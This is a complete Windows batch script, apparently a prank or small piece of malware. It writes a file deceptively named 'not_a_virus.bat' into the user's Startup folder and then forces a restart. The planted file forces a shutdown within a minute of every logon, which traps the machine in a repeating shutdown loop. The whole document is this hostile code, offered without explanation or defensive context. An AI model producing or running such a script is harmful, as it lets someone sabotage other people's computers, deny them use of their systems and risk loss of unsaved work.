@echo off
cd "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup"
echo shutdown -s -t 60 -c "c:" -f> not_a_virus.bat
shutdown -r -t 10 -c "c:" -f
exit